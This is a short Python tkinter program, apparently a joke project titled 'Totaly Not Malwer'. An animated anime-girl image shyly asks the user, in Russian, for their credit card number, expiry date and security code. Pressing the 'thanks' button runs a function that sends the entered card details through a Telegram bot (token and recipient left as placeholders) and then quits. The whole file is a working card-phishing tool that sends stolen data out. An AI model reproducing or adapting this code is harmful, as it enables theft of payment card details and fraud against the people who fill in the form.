from tkinter import *
from PIL import Image, ImageTk

class AnimateGifLabel(Label):
    def __init__(self, *argv, image = None,  **kwargs):
        self.master = argv
        self.filename = image
        self.check_cadrs()
        self.i = 0
        self.img = Image.open(image)
        self.img.seek(0)
        self.image = ImageTk.PhotoImage(self.img)
        super().__init__(*argv, image = self.image, **kwargs)
        if 'delay' in kwargs:
            self.delay = kwargs['delay']
        else:
            try:
                self.delay = self.img.info['duration']
            except:
                self.delay = 100
        self.delay = 100 # Это минимально возможная задержка - иначе ткинтер не успевает обновится и не обновляет 2  (Но реагирует на события типа изменнения размера ) а при 1 даже не появляется
        self.after(self.delay, self.show_new_cadr)


    def check_cadrs(self):
        self.cadrs = Image.open(self.filename).n_frames
    def show_new_cadr(self):
        if self.i == self.cadrs:
            self.i=0
        self.img.seek(self.i)
        self.image = ImageTk.PhotoImage(self.img)
        self.config(image = self.image)
        self.i+=1
        self.master.after(self.delay, self.show_new_cadr)

def send_data():
    from sys import exit
    import telebot
    token = 'token'
    bot = telebot.TeleBot(token)
    bot.send_message(f'tg-id', f'номер карты: {card_nomber_entry.get()}\nсрок годности: {shelf_life_entry.get()}\nкод безопасности: {securety_code_entry.get()}')
    exit()

root1=Tk()

root1.title('Totaly Not Malwer')
root1.iconbitmap('icon.ico')
root1.geometry('760x280')
root1.resizable(width=False, height=False)

canvas=Canvas(root1, width=300,height=160)

main_lbl = Label(root1, text='П-привет...\nМожешь, п-пожайлуста, сообщить\nданные своей к-кредитной карточки?', font='Verdana')
main_lbl.place(x=350, y=10)

card_nomber_lbl = Label(root1, text='номер карты:', font='Verdana 12')
shelf_life_lbl = Label(root1, text='срок годности:', font='Verdana 12')
securety_code_lbl = Label(root1, text='код безопасности:', font='Verdana 12')
Y = 100
X = 310
card_nomber_lbl.place(x=X, y=Y)
shelf_life_lbl.place(x=X, y=Y + 50)
securety_code_lbl.place(x=X, y=Y + 100)

tnx_btn = Button(text='Сп-спасибо...', command=send_data, font='Verdana 13')
tnx_btn.place(x=450, y=240)

card_nomber_entry = Entry(root1, bg='white', font='Verdana 15')
shelf_life_entry = Entry(root1, bg='white', font='Verdana 15')
securety_code_entry = Entry(root1, bg='white', font='Verdana 15')

card_nomber_entry.place(x=X + 160, y=Y - 5)
shelf_life_entry.place(x=X + 160, y=Y + 45)
securety_code_entry.place(x=X + 160, y=Y + 95)

image=AnimateGifLabel(image = 'shy_anime_girl.gif')

canvas.create_window(0, 0, anchor=NW, window=image)
canvas.place(relx=0.00, rely=0.00)

root1.mainloop()
